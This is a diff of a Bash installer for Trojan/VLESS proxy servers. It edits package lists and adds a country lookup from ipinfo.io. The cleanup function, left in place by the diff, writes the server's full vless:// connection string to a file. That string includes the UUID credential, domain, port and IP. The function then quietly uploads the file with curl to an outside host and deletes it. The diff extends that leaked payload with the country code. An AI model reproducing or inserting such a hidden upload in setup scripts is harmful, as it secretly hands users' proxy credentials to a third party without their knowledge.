@@ -182,11 +182,10 @@ readconfig(){
 ## 清理apt以及模块化的.sh文件等
 clean_env(){
 prasejson
-apt-get purge python-pil python3-qrcode -q -y
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(grpc_cdn_${myip})" &> ${myip}.txt
+echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(grpc_${mycountry}_${myip})" &> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
@@ -271,6 +270,7 @@ if [[ $install_status != 1 ]]; then
   fi
   curl --retry 5 -s https://ipinfo.io?token=56c375418c62c9 --connect-timeout 300 > /root/.trojan/ip.json
   myip="$( jq -r '.ip' "/root/.trojan/ip.json" )"
+  mycountry="$( jq -r '.country' "/root/.trojan/ip.json" )"
   localip=$(ip -4 a | grep inet | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
   myipv6=$(ip -6 a | grep inet6 | grep "scope global" | awk '{print $2}' | cut -d'/' -f1)
 fi
@@ -285,7 +285,7 @@ set +e
 TERM=ansi whiptail --title "安装中" --infobox "安装基础软件中..." 7 68
 apt-get update
 colorEcho ${INFO} "Installing all necessary Software"
-apt-get install sudo git curl xz-utils wget apt-transport-https gnupg lsb-release python-pil unzip resolvconf ntpdate systemd dbus ca-certificates locales iptables software-properties-common cron e2fsprogs less neofetch -y
+apt-get install sudo git curl xz-utils wget apt-transport-https gnupg lsb-release unzip resolvconf ntpdate systemd dbus ca-certificates locales iptables software-properties-common cron e2fsprogs less neofetch -y
 sh -c 'echo "y\n\ny\ny\n" | DEBIAN_FRONTEND=noninteractive apt-get install ntp -q -y'
 clear
 }
